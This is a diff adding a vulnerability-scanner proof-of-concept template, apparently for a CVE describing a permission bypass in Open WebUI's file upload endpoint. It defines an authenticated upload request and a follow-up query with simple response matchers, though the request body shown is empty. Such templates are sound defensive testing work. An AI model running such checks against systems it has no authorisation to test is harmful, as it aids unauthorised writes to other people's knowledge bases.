@@ -1,0 +1,51 @@
+[info]
+author = "ave"
+description = "验证 Open WebUI 文件上传接口是否绕过知识库写权限校验。通过向文件上传端点发送带有恶意 metadata.knowledge_id 的请求，检测只读用户能否向目标知识库添加文件。"
+id = "POC-AVE-2026-0816"
+name = "Open WebUI 知识库文件上传权限绕过 PoC"
+severity = "medium"
+tags = ["ave-2026-0816"]
+vuln_id = [
+    "CVE-2026-59217",
+    "AVE-2026-0816",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/files/upload"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "multipart/form-data"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["id"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/knowledge/{{knowledge_id}}/files"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["file_id"]
